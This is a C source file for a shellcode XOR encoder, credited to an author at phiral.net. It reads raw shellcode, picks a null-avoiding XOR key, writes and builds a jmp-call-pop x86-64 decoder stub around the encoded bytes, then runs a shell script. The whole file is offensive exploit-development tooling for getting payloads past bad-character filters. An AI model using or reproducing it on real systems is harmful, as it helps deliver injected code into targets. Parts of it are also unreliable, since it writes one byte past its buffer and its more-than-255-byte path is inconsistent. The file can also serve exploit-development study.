#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <stdlib.h>

#define DEBUG 0
#define AS "/usr/bin/as"
#define LD "/usr/bin/ld"
#define SC "./sc.sh"

void 
compile_exec(void) {
    pid_t pid;
    int status;
    char *const as_parm[] = {AS, "loader.s", "-o", "loader.o", NULL};
    char *const ld_parm[] = {LD, "loader.o", "-o", "loader", NULL};
    char *const sc_parm[] = {SC, NULL};

    if ((pid = fork()) < 0) {
        perror("fork");
        _exit(-1);
    } else if (pid == 0) {
        execve(AS, as_parm, NULL);
        _exit(0);
    } else {
        if (wait(&status) != pid)
            perror("wait");
    }

    if ((pid = fork()) < 0) {
        perror("fork");
        _exit(-1);
    } else if (pid == 0) {
        execve(LD, ld_parm, NULL);
        _exit(0);
    } else {
        if (wait(&status) != pid)
            perror("wait");
    }

    if ((pid = fork()) < 0) {
        perror("fork");
        _exit(-1);
    } else if (pid == 0) {
        execve(SC, sc_parm, NULL);
        _exit(0);
    } else {
        if (wait(&status) != pid)
            perror("wait");
    }

    return;
}

void 
write_asm(int sc_len, int xor_with, const char *bytes) {
   
    FILE *fp;

    printf("shellcode length: %d\n", sc_len);

    if ((fp = fopen("loader.s", "w")) == NULL) {
        perror("fopen");
        exit(-1);
    }

    fprintf(fp, ".section .data\n");
    fprintf(fp, ".globl _start\n");
    fprintf(fp, "_start:\n");
    fprintf(fp, "    xorq %%r8, %%r8\n");
    if (sc_len > 255) {
        fprintf(fp, "    movw $%d, %%r9w\n", xor_with);
    } else {
        fprintf(fp, "    movb $%d, %%r9b\n", xor_with);
    }
    fprintf(fp, "    jmp get_sc_addr\n");
    fprintf(fp, "jmp_back:\n");
    fprintf(fp, "    popq %%rax\n");
    fprintf(fp, "    xorq %%rcx, %%rcx\n");
    fprintf(fp, "    xorq %%rbx, %%rbx\n");
    fprintf(fp, "xor_loop:\n");
    if (sc_len > 255) {
        fprintf(fp, "    movw (%%rax, %%rcx, 2), %%bx\n");
    } else {
        fprintf(fp, "    movb (%%rax, %%rcx, 1), %%bl\n");
    }
    fprintf(fp, "    cmpq %%r8, %%rbx\n");
    fprintf(fp, "    je exec_sc\n");
    if (sc_len > 255) {
        fprintf(fp, "    xorw %%r9w, %%bx\n");
        fprintf(fp, "    movw %%bx, (%%rax, %%rcx, 2)\n");
    } else {
        fprintf(fp, "    xorb %%r9b, %%bl\n");
        fprintf(fp, "    movb %%bl, (%%rax, %%rcx, 1)\n");
    }
    fprintf(fp, "    incq %%rcx\n");
    fprintf(fp, "    jmp xor_loop\n");
    fprintf(fp, "get_sc_addr:\n");
    fprintf(fp, "    call jmp_back\n");
    fprintf(fp, "exec_sc:\n");
    fprintf(fp, "   .byte %s\n", bytes);
    fprintf(fp, "\n\n");

    fclose(fp);
 
}

int 
main(int argc, char **argv) {

    struct stat sstat;
    int i, n, fd, len, xor_with;
    unsigned char *fbuf, *ebuf;
    unsigned char bad_chars[256] = {0};

    if (lstat("sc.bin", &sstat) < 0) {
        perror("lstat");
        _exit(-1);
    }

    len = sstat.st_size;
    if ((fbuf = (unsigned char *)malloc(len)) == NULL) {
        perror("malloc");
        _exit(-1);
    }
    
    if ((fd = open("sc.bin", O_RDONLY)) < 0) {
        perror("open");
        _exit(-1);
    }

    if (read(fd, fbuf, len) != len) {
        perror("read");
        _exit(-1);
    }

    close(fd);

    for (n = 0; n < len; n++) {
        for (i = 1; i < 256; i++) {
             if ((i^*(fbuf+n)) == 0) {
                 bad_chars[i] = i;
                 if (DEBUG) printf("[*] Inserting %02x into bad_chars[%d]\n", i, i);
             }
        }
    }  
    /*
    for (i = 0; i < 256; i++) {
        if (bad_chars[i] != '\0') printf("bad-> %d\n", bad_chars[i]);
    }
    */
    for (i = 1, xor_with = 0; i < 256; i++) {
        if (bad_chars[i] == '\0') {
            if (DEBUG) printf("[*] XOR with 0x%02x\n", i);
            xor_with = i;
            break;
        }
    }

    if (xor_with != 0) {
        if ((ebuf = (unsigned char *)malloc(len*5+4+1)) == NULL) {
            perror("malloc");
            _exit(-1);
        }

        printf("\n");
        for (i = 0; i < len; i++) {
            if (DEBUG) {
                if (i > 0 && i % 15 == 0) printf("\n");
                printf("\\x%02x", xor_with^*(fbuf+i));
            } else {
                sprintf(ebuf+(i*5), "0x%02x,", xor_with^*(fbuf+i));
            }
        }
 
        if (DEBUG) {
            printf("\n\n");
        } else {
            sprintf(ebuf+(i*5), "0x%02x", 0);
            ebuf[len*5+4+1] = '\0';
            printf("/*************************************/\n");
            printf("/*                                   */\n");
            printf("/* entropy [at] phiral.net           */\n");
            printf("/* simple shellcode xor encoder      */\n");
            printf("/*                                   */\n");
            printf("/*************************************/\n\n");
            write_asm(len, xor_with, ebuf);
            compile_exec();            
        }
    } else {
        printf("[*] No byte found to XOR with :(\n");
        _exit(-1);
    }

    return 0;
}
